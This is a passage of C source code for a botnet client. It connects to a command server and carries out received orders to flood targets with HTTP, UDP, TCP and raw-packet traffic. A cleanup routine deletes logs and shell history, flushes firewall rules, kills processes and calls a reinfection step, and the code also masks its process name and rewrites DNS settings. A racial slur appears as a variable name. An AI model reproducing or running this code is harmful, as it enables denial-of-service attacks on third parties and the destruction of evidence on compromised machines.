	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}
void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UsrAgents[(rand() % 5)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void SendHTTPHEX(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_payload[2048];
	sprintf(hex_payload, "x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, UsrAgents[(rand() % 5)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void SendHTTPTXT(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], text_payload[2048];
	sprintf(text_payload, "KADENBOTNETYt4WLWrWnrm0iqhijcu2N7zTH8iGFqb65w62U6RNnyikqB6Yi4PJb32TP5uQVyQRMrRMzjRB7rFKADENBOTNET");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, text_payload, host, UsrAgents[(rand() % 5)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
void CleanD() { // Our plan is to just clean any Malware and our presence.
	system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
	system("rm -rf /var/log/wtmp");
	system("rm -rf /tmp/*");
	system("rm -rf /bin/netstat");
	system("iptables -F");
	//system("pkill -9 busybox");
	system("pkill -9 perl");
	system("pkill -9 python");
	system("service iptables stop");
	system("iptables -F");
	system("/sbin/iptables -F; /sbin/iptables -X");
	system("service firewalld stop");
	system("rm -rf ~/.bash_history");
	system("history -c;history -w");
	system("rm -rf /var/log/lastlog; history -c");
	ReInfect();
}

void processCmd(int argc, unsigned char *argv[]) {
        if(!strcmp(argv[0], "ICMP"))
		{
                return;
        }	
		if (!strcmp(argv[0], "HTTP"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
		
		if (!strcmp(argv[0], "HTTPHEX"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTPHEX(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
		
		if (!strcmp(argv[0], "HTTPTXT"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTPTXT(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
        if(!strcmp(argv[0], "UDP"))
		{
			if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
			{
				return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
				int spoofed = 32;
                if(strstr(ip, ",") != NULL)
				{
					unsigned char *hi = strtok(ip, ",");
					while(hi != NULL)
					{
						if(!listFork())
						{
							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
						}
						hi = strtok(NULL, ",");
					}
                } else {
							if (listFork())
							{
								return;
							}
							SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
					   }	
        }
        if(!strcmp(argv[0], "TCP"))
		{
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argc > 5 && atoi(argv[5]) < 0) || (argc == 7 && atoi(argv[6]) < 1))
				{
                        return;
				}
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                unsigned char *flags = argv[4];
                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int packetsize = argc > 5 ? atoi(argv[5]) : 0;
				int spoofed = 32;
                if(strstr(ip, ",") != NULL) {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL) {
                                if(!listFork()) {
                                        SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else	{
							if (listFork())
							{
								return;
							}
							SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
							_exit(0);
						}
        }
		if(!strcmp(argv[0], "STD"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
			{
                return;
            }
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			if(strstr(ip, ",") != NULL)
			{
				unsigned char *hi = strtok(ip, ",");
				while(hi != NULL)
				{
					if(!listFork())
					{
						SendSTD(hi, port, time);
						_exit(0);
					}
					hi = strtok(NULL, ",");
				}
            } else {
						if (listFork())
						{
							return;
						}
                        SendSTD(ip, port, time);
                        _exit(0);
                   }
		}
                if(!strcmp(argv[0], "STDHEX"))
	{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *niggas = strtok(ip, ",");
			while(niggas != NULL)
			{
				if(!listFork())
				{
					SendSTDHEX(niggas, port, time);
					_exit(0);
				}
				niggas = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			SendSTDHEX(ip, port, time);
			_exit(0);
		}
	}	
        if(!strcmp(argv[0], "STOP"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					
                } else {
							
					   }
        }
        if(!strcmp(argv[0], "LOGOUT"))
		{
                exit(0);
        }
        if(!strcmp(argv[0], "CLEAN"))
		{
            CleanD();
			sockprintf(mainCommSock, "[Cleaning] [%s:%s]", getBuild(), getEndianness());
        }
}
int initConnection() {
    unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, commServer[currentServer]);
	int port = 23;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
	return 0;
}
void UpdateNameSrvs() {
    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
    if (access("/etc/resolv.conf", F_OK) != -1) {
        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
        size_t resl = strlen(resd);
        write(fhandler, resd, resl);
	} else { return; }
    close(fhandler);
}

int getEndianness(void)
{
	union
	{
		uint32_t vlu;
		uint8_t data[sizeof(uint32_t)];
	} nmb;
	nmb.data[0] = 0x00;
	nmb.data[1] = 0x01;
	nmb.data[2] = 0x02;
	nmb.data[3] = 0x03;
	switch (nmb.vlu)
	{
		case UINT32_C(0x00010203):
			return "BIG_ENDIAN";
		case UINT32_C(0x03020100):
			return "LITTLE_ENDIAN";
		case UINT32_C(0x02030001):
			return "BIG_ENDIAN_W";
		case UINT32_C(0x01000302):
			return "LITTLE_ENDIAN_W";
		default:
			return "UNKNOWN";
	}
}
//int main(int argc, unsigned char *argv[]) {
int main(int argc, char** argv) {
        const char *lolsuckmekid = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
        strncpy(argv[0],"",strlen(argv[0]));
        argv[0] = "";
        prctl(PR_SET_NAME, (unsigned long) lolsuckmekid, 0, 0, 0);
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
		chdir("/");	
		setuid(0);				
		seteuid(0);
        signal(SIGPIPE, SIG_IGN);
        while(1) {
				if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; }
				sockprintf(mainCommSock, "CONNECTION. Arch: %s || Type: %s]", getBuild(), getEndianness()); // Add Colors or whatever you want fucker
				UpdateNameSrvs(); // We're just gonna go ahead and update the name servers because Kaden said so
				// CleanD(); We could do this, but we're gonna kill a lot upon infect... so lets not 
				char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }
                        commBuf[got] = 0x00;
                        trim(commBuf);
                        if(strstr(commBuf, "ICMP") == commBuf) { 
                                continue;
                        }
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); 
                        unsigned char *message = commBuf;
                        if(*message == '!') {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;
                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;
                                while(pch) {
                                        if(*pch != '\n') {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                processCmd(paramsCount, params);
                                if(paramsCount > 1) {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++) {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }
        return 0;
	}
}
